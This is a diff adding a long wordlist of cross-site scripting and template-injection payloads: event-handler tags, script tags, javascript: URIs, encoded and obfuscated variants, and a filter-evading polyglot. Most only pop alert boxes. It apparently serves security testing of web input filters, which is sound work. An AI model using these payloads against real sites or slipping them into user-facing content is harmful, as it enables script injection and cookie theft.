@@ -1,0 +1,2188 @@
+<span ondblclick='alert(1)'>
+<script>alert(97)</script>
+<audio ondblclick=alert(1)>
+<svg/onload=alert(4)>
+<script>alert(11)</script>
+<a onkeydown="alert(1)">
+<form oncontextmenu=alert(1)>
+<script>alert(22)</script>
+<script>alert('XSS')</script>
+<details onfocus="alert(1)">
+<script>alert(91)</script>
+<video src=x onwheel=alert(1)>
+<img src=x onerror=alert(8)>
+<svg/onload=alert(71)>
+<svg ondrop='alert(1)'>
+<td onwheel="alert(1)">
+<svg onblur="alert(1)">
+<embed onkeydown='alert(1)'>
+<marquee oninput='alert(1)'>
+<textarea onkeyup="alert(1)">
+<svg><script>alert(1)</script></svg>
+%3Cinput onerror='alert(1)'%3E
+<div onwheel="alert(1)">
+<span onload="alert(1)">
+&lt;img onload='alert(1)'&gt;
+<img src=x onerror=alert(34)>
+<embed oninput='alert(1)'>
+<video onload="alert(1)">
+<link onkeydown='alert(1)'>
+<script>alert(69)</script>
+<object ondblclick=alert(1)>
+%253Cimg src=x onerror=alert(1)%253E
+%253Ctable onerror='alert(1)'%253E
+<td onkeypress='alert(1)'>
+<td onload='alert(1)'>
+<td onmouseenter="alert(1)">
+<object onmouseleave="alert(1)">
+<td onblur="alert(1)">
+<object onload='alert(1)'>
+<script>alert(20)</script>
+<svg onfocus='alert(1)'>
+<div onchange='alert(1)'>
+<form onkeypress="alert(1)">
+<svg ondblclick="alert(1)">
+<script>setTimeout(alert(1),0)</script>
+javascript:alert(90)
+<img src=x onerror=alert(60)>
+<embed onkeyup="alert(1)">
+<img onkeyup="alert(1)">
+<div onwheel='alert(1)'>
+<\u0073cript>confirm(1)</\u0073cript>
+<img src=x onerror=alert(48)>
+<img src=x onerror=alert(12)>
+<audio src=x onerror=alert(1)>
+%3Cvideo onerror=alert(1)%3E
+<embed onclick="alert(1)">
+javascript:alert(2)
+<form onchange='alert(1)'>
+<button onkeyup='alert(1)'>
+<object onmouseover="alert(1)">
+<div onclick=alert(1)>
+<video onwheel=alert(1)>
+<textarea onfocus=alert(1) autofocus>
+<table onmouseenter=alert(1)>
+&lt;iframe onload="alert(1)"&gt;
+<input onscroll=alert(1)>
+<img src=x onerror=alert(13)>
+<link oncontextmenu='alert(1)'>
+<marquee onclick="alert(1)">
+%3Cbutton onerror="alert(1)"%3E
+<img src=x onerror=alert(4)>
+<marquee ondblclick="alert(1)">
+<iframe onwheel=alert(1)>
+%253Cinput onload=alert(1)%253E
+<iframe onload="alert(1)">
+<span onwheel=alert(1)>
+<img src=x onerror=alert(95)>
+<video ondrag=alert(1)>
+<button onmouseout=alert(1)>
+javascript:alert(23)
+<span onfocus='alert(1)'>
+<table ondblclick=alert(1)>
+<select onsubmit=alert(1)>
+%3Cform onerror="alert(1)"%3E
+<img ondrag=alert(1)>
+<span onmouseleave=alert(1)>
+javascript:alert(96)
+<img onerror='alert(1)'>
+&lt;a onerror='alert(1)'&gt;
+%3Csvg onerror="alert(1)"%3E
+%253Ctextarea onerror='alert(1)'%253E
+<marquee onscroll='alert(1)'>
+<img src=x onwheel=alert(1)>
+<a onscroll="alert(1)">
+<select onchange='alert(1)'>
+<img onkeydown=alert(1)>
+<img src=x onerror=alert(44)>
+<video ondblclick='alert(1)'>
+<audio onchange=alert(1)>
+<button onerror=alert(1)>
+<iframe onclick='alert(1)'>
+<body onkeypress="alert(1)">
+<span oncontextmenu='alert(1)'>
+&lt;a onerror=alert(1)&gt;
+<audio onload=alert(1)>
+<body onerror="alert(1)">
+<object onwheel="alert(1)">
+&lt;td onerror=alert(1)&gt;
+<select oninput=alert(1)>
+<img ondrop="alert(1)">
+<svg onfocus=alert(1)>
+<textarea onblur='alert(1)'>
+<table onmouseout='alert(1)'>
+<audio oninput='alert(1)'>
+<body onscroll="alert(1)">
+<marquee onmouseover="alert(1)">
+<svg/onload=alert(53)>
+<textarea onkeydown='alert(1)'>
+<form ondblclick="alert(1)">
+<body ondrag=alert(1)>
+<audio onwheel='alert(1)'>
+<td onwheel='alert(1)'>
+<textarea ondrop='alert(1)'>
+<object onkeyup=alert(1)>
+<object onfocus="alert(1)">
+<button onscroll="alert(1)">
+<audio onload='alert(1)'>
+%253Cscript%253Ealert(document.cookie)%253C/script%253E
+%3Cbody onload="alert(1)"%3E
+<body onchange="alert(1)">
+<svg/onload=alert(98)>
+<img onfocus="alert(1)">
+<a onmouseover=alert(1)>
+<a oncontextmenu=alert(1)>
+<audio ondblclick='alert(1)'>
+<object onkeydown=alert(1)>
+<a onerror="alert(1)">
+<svg/onload=alert(68)>
+%3Cobject onerror='alert(1)'%3E
+<div oninput='alert(1)'>
+%3Ctable onerror=alert(1)%3E
+<svg onmouseleave="alert(1)">
+&lt;video src=x onload=alert(1)&gt;
+<button onscroll=alert(1)>
+<video onerror="alert(1)">
+<svg/onload=alert(94)>
+%253Ca onerror=alert(1)%253E
+<td ondrag='alert(1)'>
+<table onmouseleave='alert(1)'>
+<marquee onmouseleave=alert(1)>
+<body onfocus='alert(1)'>
+<body onmouseover=alert(1)>
+<table oncontextmenu='alert(1)'>
+<iframe onfocus=alert(1)>
+<svg/onload=alert(43)>
+<link onkeyup="alert(1)">
+<script>alert(64)</script>
+<audio onkeydown=alert(1)>
+javascript:alert(21)
+<input onload='alert(1)'>
+<video src=x onmouseout=alert(1)>
+<link onsubmit=alert(1)>
+<marquee onclick=alert(1)>
+%3Cvideo onerror="alert(1)"%3E
+<body onkeypress='alert(1)'>
+%3Cspan onerror='alert(1)'%3E
+<audio src=x onchange=alert(1)>
+<iframe src=x onmouseleave=alert(1)>
+<svg/onload=alert(95)>
+<span ondblclick=alert(1)>
+<audio onmouseleave='alert(1)'>
+<details open ontoggle=alert(1)>
+<svg/onload=alert(99)>
+%253Csvg onerror='alert(1)'%253E
+<svg/onload=alert(14)>
+<form onmouseleave="alert(1)">
+<button onwheel='alert(1)'>
+</style><script>alert(1)</script>
+<svg/onload=alert(57)>
+&lt;embed onerror=alert(1)&gt;
+<details onkeydown=alert(1)>
+<iframe onkeypress="alert(1)">
+%253Cbutton onerror="alert(1)"%253E
+<svg/onload=alert(63)>
+%253Cvideo onload='alert(1)'%253E
+%3Cscript%3Ealert(document.domain)%3C/script%3E
+<object onblur=alert(1)>
+<img src=x onerror=alert(97)>
+<img src=x oncontextmenu=alert(1)>
+<svg onkeydown="alert(1)">
+<iframe onfocus='alert(1)'>
+<iframe ondrop='alert(1)'>
+<iframe onsubmit=alert(1)>
+<body onmouseenter=alert(1)>
+&lt;img src=x onload=alert(1)&gt;
+<details ondblclick='alert(1)'>
+<input onfocus="alert(1)">
+<link ondblclick="alert(1)">
+<video onmouseover=alert(1)>
+<iframe src=x oncontextmenu=alert(1)>
+<img src=x onmouseout=alert(1)>
+<link ondrag='alert(1)'>
+<svg/onload=alert(60)>
+<img src=x onkeydown=alert(1)>
+<iframe ondrag=alert(1)>
+<marquee onsubmit="alert(1)">
+%253Csvg onload="alert(1)"%253E
+<link ondrag=alert(1)>
+<script>confirm(1)</script>
+<iframe onclick="alert(1)">
+<script>alert(87)</script>
+<form onmouseout='alert(1)'>
+<object onclick='alert(1)'>
+%3Cselect onerror=alert(1)%3E
+javascript:alert(68)
+<audio oncontextmenu=alert(1)>
+<link onload=alert(1)>
+<audio onmouseenter="alert(1)">
+<iframe ondrag='alert(1)'>
+<embed onchange=alert(1)>
+<embed onmouseleave=alert(1)>
+<div oncontextmenu=alert(1)>
+<object onmouseout=alert(1)>
+<video oncontextmenu="alert(1)">
+&lt;script&gt;prompt(1)&lt;/script&gt;
+<a onfocus='alert(1)'>
+<body oncontextmenu=alert(1)>
+<img src=x onerror=alert(10)>
+<div onchange="alert(1)">
+<td onkeydown=alert(1)>
+<object onkeyup='alert(1)'>
+<span onblur='alert(1)'>
+<body onkeydown='alert(1)'>
+<img src=x onerror=alert(19)>
+<object onscroll="alert(1)">
+<details onmouseleave="alert(1)">
+%253Cselect onerror=alert(1)%253E
+<form onerror=alert(1)>
+<embed oninput=alert(1)>
+<table onfocus=alert(1)>
+%253Cdiv onerror=alert(1)%253E
+<table oncontextmenu="alert(1)">
+<button onmouseout='alert(1)'>
+<script>alert(2)</script>
+<input onwheel=alert(1)>
+%253Ciframe onload="alert(1)"%253E
+<video onmouseover='alert(1)'>
+<input onload="alert(1)">
+&lt;object onerror='alert(1)'&gt;
+<details onblur='alert(1)'>
+<table onblur='alert(1)'>
+<details onmouseenter="alert(1)">
+<form ondrag="alert(1)">
+<textarea ondrop=alert(1)>
+<\u0073cript>prompt(1)</\u0073cript>
+<svg/onload=alert(8)>
+<button onchange='alert(1)'>
+<script>alert(31)</script>
+<form onfocus='alert(1)'>
+<img src=x onerror=alert(15)>
+%253Csvg onload=alert(1)%253E
+%3Ca onerror='alert(1)'%3E
+<svg onkeydown=alert(1)>
+<form oncontextmenu='alert(1)'>
+<span onkeyup="alert(1)">
+<object ondblclick='alert(1)'>
+&lt;script&gt;eval(alert(1))&lt;/script&gt;
+<table onsubmit="alert(1)">
+<form onscroll="alert(1)">
+<iframe src=x onfocus=alert(1)>
+javascript:alert(95)
+<img src=x onerror=alert(56)>
+%253Cinput onerror=alert(1)%253E
+<iframe onblur=alert(1)>
+<img src="x" onerror="alert(1)">
+<select onkeypress='alert(1)'>
+&lt;embed onerror="alert(1)"&gt;
+<marquee onmouseover='alert(1)'>
+%3Ciframe src=x onload=alert(1)%3E
+<marquee ondrag=alert(1)>
+<iframe src=x onkeydown=alert(1)>
+<script>alert(30)</script>
+<img onchange=alert(1)>
+<svg onchange='alert(1)'>
+<div onmouseover="alert(1)">
+<embed onload="alert(1)">
+<img src=x onerror=alert(16)>
+<div onsubmit=alert(1)>
+<img src=x onerror=alert(88)>
+<body onblur="alert(1)">
+<button onchange="alert(1)">
+<body onmouseout='alert(1)'>
+javascript:alert(85)
+<embed src=x onkeypress=alert(1)>
+<svg/onload=alert(82)>
+%3Ctextarea onerror='alert(1)'%3E
+%3Ctd onerror='alert(1)'%3E
+<details oncontextmenu="alert(1)">
+<embed onerror="alert(1)">
+<form onchange="alert(1)">
+javascript:alert(0)
+<input onmouseout='alert(1)'>
+<svg/onload=alert(91)>
+%3Cmarquee onerror=alert(1)%3E
+<marquee onblur="alert(1)">
+<img src=x onerror=alert(68)>
+<svg oncontextmenu='alert(1)'>
+javascript:alert(53)
+<body oncontextmenu='alert(1)'>
+<object onsubmit=alert(1)>
+<embed src=x onmouseleave=alert(1)>
+<svg/onload=alert(12)>
+<div oncontextmenu='alert(1)'>
+%253Cscript%253Econsole.log(1)%253C/script%253E
+<svg/onload=alert(51)>
+<form onscroll=alert(1)>
+<audio onblur='alert(1)'>
+<form ondblclick=alert(1)>
+%253Caudio onerror=alert(1)%253E
+<body onmouseover='alert(1)'>
+<\u0073cript>alert(document.domain)</\u0073cript>
+<div ondblclick=alert(1)>
+<button oninput="alert(1)">
+<a onwheel=alert(1)>
+<script>alert(6)</script>
+<details ondblclick="alert(1)">
+<img onerror="alert(1)">
+%3Cform onerror='alert(1)'%3E
+<img src=x onerror=alert(29)>
+%3Csvg onerror=alert(1)%3E
+&lt;div onerror="alert(1)"&gt;
+<svg/onload=alert(3)>
+<iframe src=x ondblclick=alert(1)>
+<td ondrop='alert(1)'>
+<textarea onfocus="alert(1)">
+<img src=x onerror=alert(31)>
+<div onkeypress="alert(1)">
+<img src=x onerror=alert(11)>
+<video onkeydown='alert(1)'>
+&lt;iframe onerror='alert(1)'&gt;
+javascript:alert(24)
+<object onmouseenter="alert(1)">
+<div onkeypress=alert(1)>
+<script>alert(8)</script>
+javascript:alert(15)
+%3Cvideo src=x onerror=alert(1)%3E
+<iframe onload='alert(1)'>
+<video onmouseleave="alert(1)">
+<button onclick="alert(1)">
+<audio onmouseover="alert(1)">
+<textarea ondrag=alert(1)>
+<span oninput='alert(1)'>
+<embed onmouseenter=alert(1)>
+<textarea onerror='alert(1)'>
+<embed ondrop="alert(1)">
+<script>alert(43)</script>
+<object ondrop=alert(1)>
+<svg/onload=alert(30)>
+<details onerror=alert(1)>
+<embed onfocus="alert(1)">
+<div ondrag="alert(1)">
+<td oncontextmenu=alert(1)>
+&lt;script&gt;console.log(1)&lt;/script&gt;
+<audio onclick='alert(1)'>
+<svg/onload=alert(85)>
+<select ondrag="alert(1)">
+<video onfocus="alert(1)">
+'"><img src=x onerror=alert(1)//>
+<span ondblclick="alert(1)">
+<script>alert(79)</script>
+<table onmouseout=alert(1)>
+<script>alert(86)</script>
+<embed src=x onmouseenter=alert(1)>
+<select onmouseenter="alert(1)">
+<td oninput=alert(1)>
+<button onmouseout="alert(1)">
+%253Cdetails onerror="alert(1)"%253E
+<body ondblclick='alert(1)'>
+<textarea onkeypress='alert(1)'>
+<img src=x ondblclick=alert(1)>
+<td onfocus='alert(1)'>
+<span onmouseenter=alert(1)>
+<iframe src=javascript:alert(1)>
+<div onkeydown="alert(1)">
+<button onkeypress="alert(1)">
+<textarea onclick='alert(1)'>
+<audio onkeydown="alert(1)">
+<svg/onload=alert(73)>
+<button oninput=alert(1)>
+<select onsubmit="alert(1)">
+&lt;iframe onload='alert(1)'&gt;
+<audio src=x onmouseout=alert(1)>
+<table onchange=alert(1)>
+<video onmouseenter='alert(1)'>
+<svg ondrag="alert(1)">
+&lt;details onerror="alert(1)"&gt;
+<select onload=alert(1)>
+<iframe onkeydown='alert(1)'>
+<svg oncontextmenu="alert(1)">
+%3Ciframe onerror="alert(1)"%3E
+<svg/onload=alert(11)>
+<\u0073cript>setTimeout(alert(1),0)</\u0073cript>
+<span oninput="alert(1)">
+javascript:alert(80)
+<img src=x onkeyup=alert(1)>
+<textarea onscroll="alert(1)">
+<body oninput=alert(1)>
+<script>alert(45)</script>
+<svg ondblclick=alert(1)>
+<script>alert(53)</script>
+<img onmouseout='alert(1)'>
+<embed onscroll="alert(1)">
+%3Cbody onerror="alert(1)"%3E
+<div onmouseleave="alert(1)">
+<a onclick="alert(1)">
+<script>alert(24)</script>
+javascript:alert(82)
+<marquee onwheel=alert(1)>
+<svg onchange="alert(1)">
+<select onblur='alert(1)'>
+<input onfocus='alert(1)'>
+<img ondblclick='alert(1)'>
+<td onkeyup="alert(1)">
+<span onsubmit=alert(1)>
+<audio onkeyup="alert(1)">
+<script>alert(95)</script>
+<audio onkeypress="alert(1)">
+%253Cbody onload='alert(1)'%253E
+${alert(1)}
+<img onmouseenter="alert(1)">
+<details onmouseover=alert(1)>
+{{$on.constructor('alert(1)')()}}
+<svg/onload=alert(2)>
+<svg/onload=alert(59)>
+<link ondrag="alert(1)">
+<form onwheel=alert(1)>
+<audio onkeydown='alert(1)'>
+<div onwheel=alert(1)>
+<iframe onscroll="alert(1)">
+&lt;img onerror="alert(1)"&gt;
+<select onwheel='alert(1)'>
+%3Cimg onerror="alert(1)"%3E
+&lt;svg onerror="alert(1)"&gt;
+javascript:alert(49)
+javascript:alert(3)
+&lt;input onload="alert(1)"&gt;
+<svg><set attributeName=onload onload=alert(1)>
+<audio onmouseleave=alert(1)>
+<embed onblur='alert(1)'>
+<details ondrop=alert(1)>
+<link onmouseout="alert(1)">
+%253Cselect onerror='alert(1)'%253E
+<img src=x onerror=alert(91)>
+%253Cscript%253Ealert('XSS')%253C/script%253E
+<script>alert(96)</script>
+<div onmouseout='alert(1)'>
+<iframe onkeyup=alert(1)>
+&lt;body onload="alert(1)"&gt;
+<\u0073cript>eval(alert(1))</\u0073cript>
+<img onmouseover="alert(1)">
+<embed onmouseout='alert(1)'>
+<details ondrop="alert(1)">
+javascript:alert(14)
+<td onfocus=alert(1)>
+<iframe src=x oninput=alert(1)>
+<video onmouseout='alert(1)'>
+javascript:alert(86)
+<audio onfocus=alert(1)>
+javascript:alert(61)
+<div onmouseenter='alert(1)'>
+<iframe onblur="alert(1)">
+<embed onmouseenter="alert(1)">
+<details onkeypress=alert(1)>
+<span oncontextmenu=alert(1)>
+<td onchange="alert(1)">
+<video onmouseout=alert(1)>
+<form onmouseover=alert(1)>
+<img src=x onerror=alert(67)>
+%253Cspan onerror="alert(1)"%253E
+<input oncontextmenu="alert(1)">
+<svg/onload=alert(18)>
+<embed oncontextmenu='alert(1)'>
+<svg/onload=alert(79)>
+<a onkeypress="alert(1)">
+<table ondrag='alert(1)'>
+<script>alert(16)</script>
+<iframe onclick=alert(1)>
+%253Cform onerror=alert(1)%253E
+<details onsubmit="alert(1)">
+%3Cembed onerror='alert(1)'%3E
+%3Csvg onerror='alert(1)'%3E
+%253Cselect onerror="alert(1)"%253E
+<select onsubmit='alert(1)'>
+<script >alert(1)</script>
+<textarea onblur=alert(1)>
+<script>console.log(1)</script>
+<div onmouseenter=alert(1)>
+<input oninput="alert(1)">
+<img src=x onerror=alert(30)>
+<span onwheel="alert(1)">
+<details ondrag=alert(1)>
+<object onkeypress="alert(1)">
+&lt;script&gt;setInterval(alert(1),0)&lt;/script&gt;
+javascript:alert(5)
+<span onerror="alert(1)">
+<table onmouseenter="alert(1)">
+<input onchange='alert(1)'>
+<embed onmouseout=alert(1)>
+<body ondblclick=alert(1)>
+<img src=x:alert(1) onerror=eval(src)>
+<button onclick=alert(1)>
+<embed onmouseover='alert(1)'>
+&lt;iframe onerror="alert(1)"&gt;
+<script>prompt(1)</script>
+<svg onmouseover="alert(1)">
+<object ondrag='alert(1)'>
+%253Cbody onload=alert(1)%253E
+<a ondrag=alert(1)>
+<audio onchange='alert(1)'>
+<td onmouseenter=alert(1)>
+'"><script>alert(1)</script>
+<body onchange='alert(1)'>
+%253Ctd onerror=alert(1)%253E
+<svg/onload=alert(25)>
+<embed onfocus='alert(1)'>
+javascript:alert(9)
+javascript:alert(92)
+<img onscroll="alert(1)">
+<iframe onsubmit='alert(1)'>
+<link onkeypress="alert(1)">
+<select onfocus='alert(1)'>
+<script>alert(65)</script>
+<iframe ondblclick='alert(1)'>
+<script>alert(54)</script>
+javascript:alert(37)
+<iframe ondblclick="alert(1)">
+<input onkeyup="alert(1)">
+<textarea oninput=alert(1)>
+<audio onclick=alert(1)>
+<div ondrop="alert(1)">
+<select onmouseenter=alert(1)>
+<video ondrag="alert(1)">
+<div onload='alert(1)'>
+<audio onscroll="alert(1)">
+<link onmouseleave=alert(1)>
+javascript:alert(50)
+<input onkeypress='alert(1)'>
+<iframe onfocus="alert(1)">
+<button ondrag=alert(1)>
+<img src=x onerror=alert(40)>
+<textarea onfocus='alert(1)'>
+JaVaScRiPt:alert(1)
+<svg onkeyup="alert(1)">
+<td onload=alert(1)>
+<marquee oninput="alert(1)">
+&lt;audio onload=alert(1)&gt;
+<object onerror=alert(1)>
+<iframe onchange='alert(1)'>
+<embed onkeypress="alert(1)">
+<iframe onerror=alert(1)>
+&lt;video onerror=alert(1)&gt;
+javascript:alert(67)
+<img src=x onerror=alert(49)>
+&lt;input onerror="alert(1)"&gt;
+<script>alert(37)</script>
+<img src=x onerror=alert(80)>
+%253Cimg onerror='alert(1)'%253E
+<input onblur='alert(1)'>
+javascript:alert(8)
+<textarea onwheel='alert(1)'>
+<div onmouseover='alert(1)'>
+<button onmouseleave="alert(1)">
+<object oncontextmenu='alert(1)'>
+<audio onerror='alert(1)'>
+<object onload=alert(1)>
+<button ondrop=alert(1)>
+<iframe onmouseover=alert(1)>
+<audio onmouseover='alert(1)'>
+<input onerror=alert(1)>
+<marquee ondrag='alert(1)'>
+<iframe onkeypress='alert(1)'>
+<link oninput=alert(1)>
+<iframe ondrag="alert(1)">
+<a onmouseover="alert(1)">
+<marquee onkeyup="alert(1)">
+javascript:alert(98)
+<span onchange=alert(1)>
+<video ondrop='alert(1)'>
+%253Cscript%253Eeval(alert(1))%253C/script%253E
+<img onchange='alert(1)'>
+<marquee onmouseenter="alert(1)">
+<input onmouseout=alert(1)>
+<svg onsubmit='alert(1)'>
+<td ondrag=alert(1)>
+<svg/onload=alert(50)>
+<audio ondrop=alert(1)>
+</title><script>alert(1)</script>
+%3Ca onerror="alert(1)"%3E
+<button ondblclick=alert(1)>
+<svg/onload=alert(80)>
+<div onmouseenter="alert(1)">
+<link onmouseover="alert(1)">
+%3Cvideo onload='alert(1)'%3E
+<select ondrop="alert(1)">
+%3Ciframe onload=alert(1)%3E
+<img onfocus='alert(1)'>
+<link onmouseenter="alert(1)">
+<script>alert(10)</script>
+%3Csvg onload="alert(1)"%3E
+<details onmouseenter=alert(1)>
+<object onwheel=alert(1)>
+%253Clink onerror="alert(1)"%253E
+<svg/onload=alert(55)>
+<table onkeypress="alert(1)">
+%253Cdetails onerror='alert(1)'%253E
+<td ondrag="alert(1)">
+javascript:alert(10)
+%253Ctextarea onerror="alert(1)"%253E
+<embed src=x ondrag=alert(1)>
+<svg onblur='alert(1)'>
+<img onkeypress=alert(1)>
+<table onscroll=alert(1)>
+<table onsubmit=alert(1)>
+<img src=x onerror=alert(5)>
+<select onkeydown=alert(1)>
+<video onmouseenter="alert(1)">
+<button onsubmit='alert(1)'>
+<textarea onkeypress="alert(1)">
+<img onload='alert(1)'>
+<details onmouseover="alert(1)">
+<img src=x onerror=alert(90)>
+%3Cdetails onerror="alert(1)"%3E
+%3Cimg src=x onerror=alert(1)%3E
+<button onmouseenter="alert(1)">
+<audio src=x onmouseenter=alert(1)>
+&lt;object onerror=alert(1)&gt;
+<embed onload=alert(1)>
+"><script>alert(1)</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+<a onmouseout='alert(1)'>
+%3Clink onerror='alert(1)'%3E
+<td onkeyup='alert(1)'>
+<svg onblur=alert(1)>
+<table onwheel='alert(1)'>
+<input onmouseenter=alert(1)>
+<input onmouseleave="alert(1)">
+&lt;marquee onerror='alert(1)'&gt;
+<audio src=x onkeydown=alert(1)>
+<details onchange='alert(1)'>
+<input onkeyup='alert(1)'>
+<details onkeyup='alert(1)'>
+<script>alert(27)</script>
+<a onwheel='alert(1)'>
+<object ondrag="alert(1)">
+<video onload='alert(1)'>
+<details onchange="alert(1)">
+<img src=x onerror=alert(47)>
+&lt;body onload=alert(1)&gt;
+<iframe onmouseenter='alert(1)'>
+<object onkeypress=alert(1)>
+%253Cimg src=x onload=alert(1)%253E
+javascript:alert(26)
+<button ondrag="alert(1)">
+<svg onfocus="alert(1)">
+<table oninput="alert(1)">
+<link onclick='alert(1)'>
+%253Cspan onerror=alert(1)%253E
+<iframe src="javascript:alert(1)">
+%3Ciframe src=x onerror=alert(1)%3E
+<details ondrag='alert(1)'>
+<svg/onload=alert(62)>
+%3Csvg onload='alert(1)'%3E
+<div onblur='alert(1)'>
+%3Ciframe onerror='alert(1)'%3E
+<script>alert(35)</script>
+<marquee onscroll=alert(1)>
+%3Caudio src=x onerror=alert(1)%3E
+<object ondrop="alert(1)">
+<img onchange="alert(1)">
+<embed src=x onload=alert(1)>
+<div ondblclick='alert(1)'>
+<svg onkeydown='alert(1)'>
+javascript:alert(66)
+<div onclick='alert(1)'>
+<input onscroll="alert(1)">
+<embed onmouseover="alert(1)">
+%253Clink onerror=alert(1)%253E
+<svg onmouseleave=alert(1)>
+javascript:alert(89)
+<script>alert(99)</script>
+<%00script>alert(1)</script>
+<svg onerror="alert(1)">
+%253Ctd onerror='alert(1)'%253E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+<img src=x onerror=alert(45)>
+<img src=x onmouseleave=alert(1)>
+<script>alert(78)</script>
+<object onscroll='alert(1)'>
+%253Cdiv onerror="alert(1)"%253E
+<a onmouseleave='alert(1)'>
+<input ondblclick="alert(1)">
+<form oninput='alert(1)'>
+<form onkeypress=alert(1)>
+<details oninput='alert(1)'>
+<svg onload='alert(1)'>
+<img onmouseover=alert(1)>
+<table onscroll='alert(1)'>
+<marquee onstart=alert(1)>
+<img src=x onerror=alert(99)>
+<video src=x onclick=alert(1)>
+<form onwheel='alert(1)'>
+{{constructor.constructor('alert(1)')()}}
+<audio oninput="alert(1)">
+<table onchange='alert(1)'>
+&lt;img onload="alert(1)"&gt;
+<marquee onchange="alert(1)">
+%253Cimg onload='alert(1)'%253E
+<svg/onload=alert(15)>
+<video oncontextmenu='alert(1)'>
+<script>alert(47)</script>
+<form onwheel="alert(1)">
+<script>alert(59)</script>
+<script>alert(60)</script>
+<svg/onload=alert(28)>
+<audio oncontextmenu="alert(1)">
+<button onmouseover='alert(1)'>
+<img onclick="alert(1)">
+<iframe src=x onmouseout=alert(1)>
+<link onerror="alert(1)">
+<textarea onmouseout='alert(1)'>
+<td onload="alert(1)">
+<svg onclick='alert(1)'>
+<img onscroll=alert(1)>
+javascript:alert(31)
+<object onsubmit='alert(1)'>
+<select onblur=alert(1)>
+&lt;video onerror='alert(1)'&gt;
+<input oncontextmenu=alert(1)>
+<link onfocus=alert(1)>
+<textarea onload=alert(1)>
+<a onkeydown=alert(1)>
+<audio onsubmit=alert(1)>
+<img src=x onerror=alert(7)>
+<img src=x onerror=alert(86)>
+<input onmouseover='alert(1)'>
+<svg/onload=alert(42)>
+%3Cimg onload="alert(1)"%3E
+<table ondrag=alert(1)>
+<img src=x onerror=alert(63)>
+<select onmouseleave="alert(1)">
+<embed ondrag="alert(1)">
+<input onwheel='alert(1)'>
+<form onblur=alert(1)>
+<svg/onload=alert(88)>
+<table ondrop="alert(1)">
+%253Ciframe src=x onload=alert(1)%253E
+<a onmouseleave=alert(1)>
+javascript:alert(74)
+<td onscroll='alert(1)'>
+<form ondrag=alert(1)>
+<audio src=x onclick=alert(1)>
+<object ondrop='alert(1)'>
+<video src=x oncontextmenu=alert(1)>
+<a onfocus="alert(1)">
+<video src=x oninput=alert(1)>
+%3Cembed onerror="alert(1)"%3E
+%3Ctd onerror="alert(1)"%3E
+<body onmouseout="alert(1)">
+<object oncontextmenu="alert(1)">
+<a onkeypress=alert(1)>
+<form ondrop="alert(1)">
+<button onkeydown=alert(1)>
+%253Cvideo onload="alert(1)"%253E
+<select onkeyup=alert(1)>
+<body ondrag="alert(1)">
+<video onsubmit=alert(1)>
+<marquee onmouseenter=alert(1)>
+<textarea ondblclick=alert(1)>
+<td onmouseout='alert(1)'>
+<select onscroll='alert(1)'>
+<span onscroll="alert(1)">
+<marquee onkeyup='alert(1)'>
+<link onwheel=alert(1)>
+<object onblur='alert(1)'>
+javascript:alert(52)
+<button ondrag='alert(1)'>
+<a oncontextmenu='alert(1)'>
+<iframe onscroll='alert(1)'>
+<object onmouseout="alert(1)">
+<embed onerror=alert(1)>
+<audio ondrop='alert(1)'>
+<svg/onload=alert(72)>
+<input onkeypress="alert(1)">
+javascript:alert(70)
+<marquee onblur='alert(1)'>
+<table onfocus="alert(1)">
+<button onfocus="alert(1)">
+<span onmouseover="alert(1)">
+<table onkeypress='alert(1)'>
+&lt;script&gt;alert(1)&lt;/script&gt;
+<script>alert(document.cookie)</script>
+<script>alert(5)</script>
+<textarea onmouseleave='alert(1)'>
+<script>alert(0)</script>
+<marquee onmouseenter='alert(1)'>
+<img src=x onclick=alert(1)>
+<span onkeydown="alert(1)">
+<video src=x onmouseenter=alert(1)>
+&lt;embed src=x onerror=alert(1)&gt;
+<script>alert(41)</script>
+<svg/onload=alert(52)>
+&lt;span onerror="alert(1)"&gt;
+&lt;body onerror=alert(1)&gt;
+<script>alert(74)</script>
+{{this.constructor.constructor('alert(1)')()}}
+javascript:alert(35)
+<link onmouseover='alert(1)'>
+<link onmouseout=alert(1)>
+<img src=x onerror=alert(41)>
+<embed onfocus=alert(1)>
+<td onmouseleave="alert(1)">
+<body onclick='alert(1)'>
+<textarea ondrag="alert(1)">
+<script>alert(66)</script>
+%253Cinput onload='alert(1)'%253E
+<marquee ondblclick=alert(1)>
+<img src=x onerror=alert(55)>
+<embed src=x onblur=alert(1)>
+<audio onmouseenter='alert(1)'>
+%3Cspan onerror="alert(1)"%3E
+<details onkeyup="alert(1)">
+<embed src=x oninput=alert(1)>
+<script>alert(14)</script>
+<td onkeyup=alert(1)>
+<a ondrop=alert(1)>
+<iframe src=x onsubmit=alert(1)>
+<table onerror='alert(1)'>
+<link onkeypress=alert(1)>
+%3Cdiv onerror="alert(1)"%3E
+<input ondblclick=alert(1)>
+<video src=x ondblclick=alert(1)>
+%3Cform onerror=alert(1)%3E
+<script>alert(33)</script>
+<span onchange="alert(1)">
+<select onload="alert(1)">
+<audio src=x onmouseleave=alert(1)>
+<link onmouseover=alert(1)>
+<details onsubmit='alert(1)'>
+<marquee onclick='alert(1)'>
+<audio onload="alert(1)">
+<td onkeypress=alert(1)>
+<script>alert(7)</script>
+<div onkeypress='alert(1)'>
+<textarea onmouseenter='alert(1)'>
+javascript:alert(84)
+<img onblur="alert(1)">
+<marquee oncontextmenu=alert(1)>
+<img src=x onerror=alert(14)>
+<form oninput="alert(1)">
+<svg onkeypress="alert(1)">
+<form onkeypress='alert(1)'>
+<link onscroll='alert(1)'>
+&lt;form onerror="alert(1)"&gt;
+<a onmouseout="alert(1)">
+{{7*7}}
+<textarea onerror=alert(1)>
+<textarea onscroll=alert(1)>
+<select onfocus=alert(1) autofocus>
+<form onclick='alert(1)'>
+<a onblur='alert(1)'>
+<marquee onmouseout="alert(1)">
+<iframe src=x onerror=alert(1)>
+<a ondrop="alert(1)">
+%253Cbody onerror="alert(1)"%253E
+<object onfocus=alert(1)>
+<script>setInterval(alert(1),0)</script>
+javascript:alert(42)
+<textarea onclick="alert(1)">
+<img src=x onerror=alert(62)>
+<a onsubmit="alert(1)">
+<iframe ondrop="alert(1)">
+<img src=x onerror=alert(21)>
+<a onkeydown='alert(1)'>
+<span oninput=alert(1)>
+%253Ctextarea onerror=alert(1)%253E
+<video onmouseover="alert(1)">
+<textarea oninput="alert(1)">
+&lt;textarea onerror=alert(1)&gt;
